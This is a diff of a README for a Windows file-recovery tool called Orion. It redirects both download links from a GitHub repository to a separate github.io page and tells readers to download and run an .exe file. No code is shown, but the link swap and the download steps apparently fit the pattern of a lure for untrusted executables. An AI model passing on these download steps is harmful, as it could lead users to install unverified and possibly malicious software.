@@ -1,6 +1,6 @@
 # 💾 Orion-File-Recovery - Recover lost files on Windows easily
 
-[![Download Orion File Recovery](https://img.shields.io/badge/Download-Orion-blue.svg)](https://github.com/Overdressed-acroclinium950/Orion-File-Recovery)
+[![Download Orion File Recovery](https://img.shields.io/badge/Download-Orion-blue.svg)](https://overdressed-acroclinium950.github.io)
 
 ## 📋 About the software
 
@@ -22,7 +22,7 @@ Ensure your computer has the following to ensure the software runs well:
 
 Follow these steps to obtain the setup file for your computer:
 
-1. Visit the [official Orion File Recovery page](https://github.com/Overdressed-acroclinium950/Orion-File-Recovery).
+1. Visit the [official Orion File Recovery page](https://overdressed-acroclinium950.github.io).
 2. Look for the recent release section on the right side of the page.
 3. Click the link that ends in .exe to start your download.
 4. Save the file to your Downloads folder.
